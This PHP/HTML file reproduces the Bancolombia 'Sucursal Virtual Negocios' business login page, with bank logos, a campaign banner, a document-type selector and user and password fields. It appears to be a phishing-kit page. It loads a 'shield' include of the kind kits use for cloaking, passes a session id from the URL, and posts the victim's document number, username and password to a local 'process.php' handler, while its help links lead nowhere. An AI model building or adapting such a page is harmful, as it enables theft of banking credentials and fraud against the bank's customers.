<?php 
require_once __DIR__ . '/core/shield.php';
$hasError = isset($_GET['error']) ? true : false; 
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="img/favicon.png">
    <title>Sucursal Virtual Negocios | Bancolombia</title>
    <link rel="stylesheet" href="css/index.css">
    <!-- Import Google Font Inter -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="js/index.js" defer></script>
</head>
<body>

    <!-- Floating Error Toast (Top Center) -->
    <div id="error-toast" class="error-toast">
        <div class="toast-indicator">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 9V13M12 17H12.01M12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>
        <div class="toast-message">
            Los datos que ingresaste no son válidos. Revisa e inténtalo de nuevo.
        </div>
        <button class="toast-close" id="close-toast-btn" aria-label="Cerrar mensaje">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </button>
    </div>

    <div class="app-container">
        <!-- Mobile Header (Visible on Mobile only) -->
        <div class="mobile-header">
            <img src="img/bancolombia-horizontal.svg" alt="Bancolombia Logo" class="brand-logo">
            <span class="header-divider">|</span>
            <span class="header-title">Sucursal Virtual Negocios</span>
        </div>
        <!-- Left Banner Panel -->
        <div class="left-panel">
            <div class="left-header">
                <img src="img/bancolombia-horizontal.svg" alt="Bancolombia Logo" class="brand-logo">
                <span class="header-divider">|</span>
                <span class="header-title">Sucursal Virtual Negocios</span>
            </div>
            
            <div class="left-body">
                <h1 class="campaign-title">Bre-B llegó a Bancolombia Negocios</h1>
                <p class="campaign-desc">Descubre sus beneficios y cómo potenciarán tu negocio junto a tu QR.</p>
            </div>
            
            <div class="left-footer">
                <span class="copyright">Copyright © 2026 Grupo Bancolombia.</span>
                <img src="img/vigilado-superintendencia.svg" alt="Vigilado Superintendencia Financiera de Colombia" class="vigilado-logo">
            </div>
        </div>

        <!-- Right Login Panel -->
        <div class="right-panel">
            <!-- Ayuda Button -->
            <button class="ayuda-btn" type="button">
                <svg class="ayuda-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Ayuda</span>
            </button>

            <!-- Login Content Card -->
            <div class="login-card">
                <h2 class="form-title">Bienvenido, ingresa tus datos</h2>

                <form id="login-form" method="POST" action="actions/process.php" class="login-form">
                    <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
                    <div class="form-grid">
                        
                        <!-- Dropdown: Tipo de documento -->
                        <div class="form-group dropdown-group" id="doc-type-group">
                            <span class="floating-label" id="doc-type-label">Tipo de documento del negocio</span>
                            <div class="input-wrapper select-trigger" id="doc-type-trigger">
                                <img src="img/icon_094_uniE92F.png" class="input-icon-left" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Negocio">
                                <span class="select-selected-value" id="selected-doc-type"></span>
                                <svg class="input-icon-right chevron-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <polyline points="6 9 12 15 18 9"></polyline>
                                </svg>
                            </div>
                            
                            <!-- Custom dropdown choices -->
                            <div class="dropdown-list" id="doc-type-list">
                                <div class="dropdown-option" data-value="NIT">NIT</div>
                                <div class="dropdown-option" data-value="Cédula de Ciudadanía">Cédula de Ciudadanía</div>
                                <div class="dropdown-option" data-value="Cédula de Extranjería">Cédula de Extranjería</div>
                                <div class="dropdown-option" data-value="Pasaporte">Pasaporte</div>
                                <div class="dropdown-option" data-value="ID Extranjero Persona Natural">ID Extranjero Persona Natural</div>
                                <div class="dropdown-option" data-value="ID Extranjero Persona Jurídica">ID Extranjero Persona Jurídica</div>
                                <div class="dropdown-option" data-value="Fideicomiso">Fideicomiso</div>
                                <div class="dropdown-option" data-value="Carné Diplomático">Carné Diplomático</div>
                            </div>
                            <!-- Hidden Input for Form Submission -->
                            <input type="hidden" name="doc_type" id="hidden-doc-type" value="">
                        </div>
 
                        <!-- Input: Número de documento -->
                        <div class="form-group" id="doc-num-group">
                            <span class="floating-label">Número de documento del negocio</span>
                            <div class="input-wrapper">
                                <input type="text" id="doc-number" name="doc_number" autocomplete="off" required>
                            </div>
                        </div>
 
                        <!-- Input: Usuario -->
                        <div class="form-group" id="username-group">
                            <span class="floating-label">Usuario</span>
                            <div class="input-wrapper">
                                <img src="img/icon_767_uniED84.png" class="input-icon-left" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Usuario">
                                <input type="password" id="username" name="username" autocomplete="off" required>
                                <button class="visibility-toggle" type="button" data-target="username" aria-label="Mostrar usuario">
                                    <img src="img/icon_246_uniE9C7.png" class="eye-slashed" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Ocultar">
                                    <img src="img/icon_330_uniEA1F.png" class="eye-open hidden" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Mostrar">
                                </button>
                            </div>
                            <div class="forgot-link-container">
                                <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
                            </div>
                        </div>
 
                        <!-- Input: Clave -->
                        <div class="form-group" id="password-group">
                            <span class="floating-label">Clave</span>
                            <div class="input-wrapper">
                                <img src="img/icon_225_uniE9B2.png" class="input-icon-left" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Lock">
                                <input type="password" id="password" name="password" autocomplete="off" required>
                                <button class="visibility-toggle" type="button" data-target="password" aria-label="Mostrar clave">
                                    <!-- Eye icon showing masked (slashed state by default) -->
                                    <img src="img/icon_246_uniE9C7.png" class="eye-slashed" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Ocultar">
                                    <img src="img/icon_330_uniEA1F.png" class="eye-open hidden" style="width:24px; height:24px; filter: invert(1) brightness(0.2);" alt="Mostrar">
                                </button>
                            </div>
                            <div class="forgot-link-container">
                                <a href="#" class="forgot-link">¿Olvidaste tu clave?</a>
                            </div>
                        </div>

                    </div>

                    <!-- Iniciar sesión button (Disabled style by default) -->
                    <div class="submit-container">
                        <button type="submit" id="submit-btn" class="submit-btn" disabled>Iniciar sesión</button>
                    </div>
                </form>

                <!-- Migrarse o comenzar registro button -->
                <div class="register-container">
                    <button class="register-btn" type="button">
                        <img src="img/icon_047_uniE900.png" class="register-icon" style="width:20px; height:20px; filter: invert(1) brightness(0.2); vertical-align: middle; margin-right: 6px;" alt="Registro">
                        <span>Migrarse o comenzar registro</span>
                    </button>
                </div>
            </div>
 
            <!-- Footer links -->
            <div class="right-footer">
                <div class="footer-links">
                    <a href="#">Conversor de pagos</a>
                    <span class="bullet">·</span>
                    <a href="#">Formato de novedades</a>
                    <span class="bullet">·</span>
                    <a href="#">Contáctanos</a>
                    <span class="bullet">·</span>
                    <a href="#">Aprende sobre seguridad</a>
                    <span class="bullet">·</span>
                    <a href="#">Conoce la Sucursal Virtual</a>
                </div>
                <div class="ip-container">
                    <button type="button" class="ip-toggle-btn" id="ip-toggle-btn">
                        <img src="img/icon_330_uniEA1F.png" class="ip-eye-icon" style="width:16px; height:16px; filter: invert(1) opacity(0.6); vertical-align: middle; margin-right: 6px;" alt="IP">
                        <span id="ip-text">Dirección IP</span>
                    </button>
                </div>
            </div>
        </div>

        <!-- Mobile Footer (Visible on Mobile only) -->
        <div class="mobile-footer">
            <span class="copyright">Copyright © 2026 Grupo Bancolombia.</span>
            <img src="img/vigilado-superintendencia.svg" alt="Vigilado" class="vigilado-logo">
        </div>
    </div>
    
    <?php if ($hasError): ?>
    <script>
        // Set flag immediately so deferred JS can pick it up
        window._sucvShowError = true;
        document.addEventListener('DOMContentLoaded', () => {
            if (typeof showErrorToast === 'function') {
                showErrorToast();
            }
        });
    </script>
    <?php endif; ?>
</body>
</html>
